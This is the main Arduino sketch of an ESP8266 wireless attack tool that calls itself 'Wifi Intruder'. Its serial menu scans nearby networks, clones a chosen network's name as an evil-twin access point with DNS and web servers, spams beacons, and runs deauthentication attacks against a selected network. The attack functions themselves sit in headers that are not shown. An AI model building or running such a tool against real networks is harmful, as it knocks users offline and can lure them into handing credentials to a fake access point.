#include <ESP8266WiFi.h>
#include "View.h"
#include "Access_Point.h"
#include "NetworkList.h"
#include "Attacks.h"

NetworkList networks;

String custom_AP_SSID;
bool apStarted = false; // if any access points are currently running
bool attacking = false; // if any attacks are currently running

void setup() {
    WiFi.disconnect(); // Disconnect from any previously connected network
    wifi_promiscuous_enable(1);
    if (!WiFi.mode(WIFI_AP_STA)){
      Serial.println("Wifi mode couldn't be setup properly");
    }

    delay(500); // Wait for the module to disconnect

    Serial.begin(115200);
    Serial.flush();

    Serial.print("\n");
    Serial.println("Welcome to Wifi Intruder. Have FUN! :]");

    delay(10);
}

void loop(){
    mainMenu();
    delay(10);
}

void mainMenu(){
    if (!attacking){

        View::printInstruction();
        uint8_t menuInput=0;
        View::getIntInput(menuInput);

        switch (menuInput){
            case 1:
                findNewNetworks();
                break;
            case 2:
                handleEvilTwin();
                break;
            case 3:
                handleCustomAP();
                break;
            case 4:
                handleBeaconSpam();
                break;
            case 5:
                handleDeauthAttack();
                break;
            case 6: // control attacks
              break;
            default:
                Serial.println("Enter a Valid Answer: ");
                View::printInstruction();
                break;
        }
    } else{

        if(apStarted){
            dnsServer.processNextRequest();
            server.handleClient();
        }
    }
}

int8_t getNetworkIndex(){
    if(networks.size == 0){
        Serial.println("No networks observed.");
        return -1;
    }

    Serial.print("\nEnter network #: ");
    uint8_t networkNum;
    View::getIntInput(networkNum);

    if(networkNum > 0 && networkNum <= networks.size){
      Serial.printf("\nChoosing network #%d: %s\n", networkNum, networks[networkNum-1]->SSID.c_str());
        return networkNum -1;
    }else{
        Serial.println("Invalid network number.");
    }
    return -1;
}

void findNewNetworks(){
    Serial.println("\nScanning for available networks:");
    int8_t newNumNetworks = WiFi.scanNetworks();
    String SSID;
    String BSSIDstr;
    uint8_t BSSID[6];
    float RSSI;
    uint8_t channel;

    for (int8_t i = 0; i < newNumNetworks; i++){
        SSID = WiFi.SSID(i);
        BSSIDstr = WiFi.BSSIDstr(i);
        memcpy(BSSID, WiFi.BSSID(i), 6);
        RSSI = WiFi.RSSI(i);
        channel = WiFi.channel(i);

        networks.addNetwork(SSID, BSSIDstr, BSSID, RSSI, channel);
    }
    networks.printNetworks();
}

void handleEvilTwin(){
    int8_t networkIndex = getNetworkIndex();
    if(networkIndex != -1){
        custom_AP_SSID = networks[networkIndex]->SSID;
        apStarted = createAP(custom_AP_SSID);
        attacking = apStarted;
    }
}

void handleCustomAP(){
    Serial.print("Enter custom SSID: ");
    View::getStrInput(custom_AP_SSID);
    apStarted = createAP(custom_AP_SSID);
    attacking = apStarted;
}

void handleBeaconSpam(){
    attacking = true;
    beaconSpam();
}

void handleDeauthAttack(){
    int8_t networkNum = getNetworkIndex();

    if(networkNum != -1){
        attacking = true;
        deauthNetwork(
            networks.getNetwork(networkNum)->channel, 
            networks.getNetwork(networkNum)->BSSID
        );
    }
}